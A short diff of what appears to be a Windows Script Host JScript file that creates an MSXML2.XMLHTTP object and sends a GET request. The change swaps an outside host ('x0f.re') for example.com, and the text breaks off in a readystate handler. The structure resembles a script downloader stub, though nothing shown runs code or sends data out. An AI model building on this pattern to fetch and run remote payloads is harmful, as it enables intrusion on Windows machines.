@@ -1,5 +1,5 @@
 var stream = WScript.CreateObject('MSXML2.XMLHTTP');
-stream.OPEN('GET', 'http://x0f.re', false);
+stream.OPEN('GET', 'http://example.com', false);
 
 stream.onreadystatechange = function() {
     if (stream.readyState === 4) {
